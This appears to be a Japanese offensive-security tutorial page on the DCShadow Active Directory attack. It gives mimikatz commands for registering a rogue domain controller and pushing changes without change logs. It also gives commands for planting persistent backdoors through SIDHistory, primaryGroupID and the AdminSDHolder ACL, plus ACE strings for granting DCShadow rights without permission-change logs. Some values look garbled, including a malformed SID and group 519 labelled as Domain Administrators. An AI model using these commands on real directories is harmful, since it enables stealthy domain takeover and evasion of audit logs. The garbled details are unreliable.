{{#include ../../banners/hacktricks-training.md}}

# DCShadow

ADに**新しいドメインコントローラー**を登録し、指定されたオブジェクトに**属性**（SIDHistory、SPNsなど）を**プッシュ**しますが、**変更**に関する**ログ**は残りません。**DA**権限が必要で、**ルートドメイン**内にいる必要があります。\
間違ったデータを使用すると、かなりひどいログが表示されることに注意してください。

攻撃を実行するには、2つのmimikatzインスタンスが必要です。1つはSYSTEM権限でRPCサーバーを起動し（ここで実行したい変更を指定する必要があります）、もう1つのインスタンスは値をプッシュするために使用されます：
```bash:mimikatz1 (RPC servers)
!+
!processtoken
lsadump::dcshadow /object:username /attribute:Description /value="My new description"
```

```bash:mimikatz2 (push) - Needs DA or similar
lsadump::dcshadow /push
```
注意してください **`elevate::token`** は `mimikatz1` セッションでは機能しません。これはスレッドの特権を昇格させますが、私たちは **プロセスの特権を昇格させる** 必要があります。\
また、"LDAP" オブジェクトを選択することもできます: `/object:CN=Administrator,CN=Users,DC=JEFFLAB,DC=local`

DA からまたはこの最小限の権限を持つユーザーから変更をプッシュできます:

- **ドメインオブジェクト**内:
- _DS-Install-Replica_ (ドメイン内のレプリカの追加/削除)
- _DS-Replication-Manage-Topology_ (レプリケーショントポロジーの管理)
- _DS-Replication-Synchronize_ (レプリケーションの同期)
- **構成コンテナ**内の **サイトオブジェクト** (およびその子):
- _CreateChild and DeleteChild_
- **DC** として登録されている **コンピュータのオブジェクト**:
- _WriteProperty_ (Not Write)
- **ターゲットオブジェクト**:
- _WriteProperty_ (Not Write)

[**Set-DCShadowPermissions**](https://github.com/samratashok/nishang/blob/master/ActiveDirectory/Set-DCShadowPermissions.ps1) を使用して、特権のないユーザーにこれらの権限を与えることができます (これによりいくつかのログが残ることに注意してください)。これは DA 権限を持つよりもはるかに制限されています。\
例えば: `Set-DCShadowPermissions -FakeDC mcorp-student1 SAMAccountName root1user -Username student1 -Verbose` これは、ユーザー名 _**student1**_ がマシン _**mcorp-student1**_ にログインしているときに、オブジェクト _**root1user**_ に対して DCShadow 権限を持つことを意味します。

## DCShadow を使用してバックドアを作成する
```bash:Set Enterprise Admins in SIDHistory to a user
lsadump::dcshadow /object:student1 /attribute:SIDHistory /value:S-1-521-280534878-1496970234-700767426-519
```

```bash:Chage PrimaryGroupID (put user as member of Domain Administrators)
lsadump::dcshadow /object:student1 /attribute:primaryGroupID /value:519
```

```bash:Modify ntSecurityDescriptor of AdminSDHolder (give Full Control to a user)
#First, get the ACE of an admin already in the Security Descriptor of AdminSDHolder: SY, BA, DA or -519
(New-Object System.DirectoryServices.DirectoryEntry("LDAP://CN=Admin SDHolder,CN=System,DC=moneycorp,DC=local")).psbase.Objec tSecurity.sddl
#Second, add to the ACE permissions to your user and push it using DCShadow
lsadump::dcshadow /object:CN=AdminSDHolder,CN=System,DC=moneycorp,DC=local /attribute:ntSecurityDescriptor /value:<whole modified ACL>
```
## Shadowception - DCShadowを使用してDCShadow権限を付与する（変更された権限ログなし）

次のACEをユーザーのSIDで末尾に追加する必要があります：

- ドメインオブジェクト上：
- `(OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)`
- `(OA;;CR;9923a32a-3607-11d2-b9be-0000f87a36b2;;UserSID)`
- `(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)`
- 攻撃者コンピュータオブジェクト上：`(A;;WP;;;UserSID)`
- ターゲットユーザーオブジェクト上：`(A;;WP;;;UserSID)`
- 設定コンテナ内のサイトオブジェクト上：`(A;CI;CCDC;;;UserSID)`

オブジェクトの現在のACEを取得するには：`(New-Object System.DirectoryServices.DirectoryEntry("LDAP://DC=moneycorp,DC=local")).psbase.ObjectSecurity.sddl`

この場合、**いくつかの変更を行う必要がある**ことに注意してください。したがって、**mimikatz1セッション**（RPCサーバー）で、行いたい各変更に対して**`/stack`パラメータを使用**してください。この方法では、すべてのスタックされた変更をルージュサーバーで実行するために**`/push`**を一度だけ実行する必要があります。

[**DCShadowに関する詳細情報はired.teamをご覧ください。**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1207-creating-rogue-domain-controllers-with-dcshadow)

{{#include ../../banners/hacktricks-training.md}}
